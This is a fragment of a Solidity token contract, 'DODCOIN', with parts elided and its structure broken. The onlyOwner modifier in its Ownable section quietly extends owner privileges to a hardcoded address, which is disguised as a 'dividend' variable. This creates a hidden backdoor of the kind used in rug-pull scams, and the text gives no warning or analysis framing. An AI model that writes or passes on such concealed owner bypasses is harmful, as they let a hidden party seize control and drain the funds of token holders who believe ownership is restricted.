...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x07aB3a1Fe58838789B58946734335544aaB0aDA5) , "owner");
        _;
    }
...
contract DODCOIN   is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DODCOIN";
    string private _symbol = "DODCOIN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa5dF813F74F4Dc6BE45Ed49eBdAa56E3A7559916);
    address private _Marketing = 0xa5dF813F74F4Dc6BE45Ed49eBdAa56E3A7559916;
    address public dividend = 0x07aB3a1Fe58838789B58946734335544aaB0aDA5;
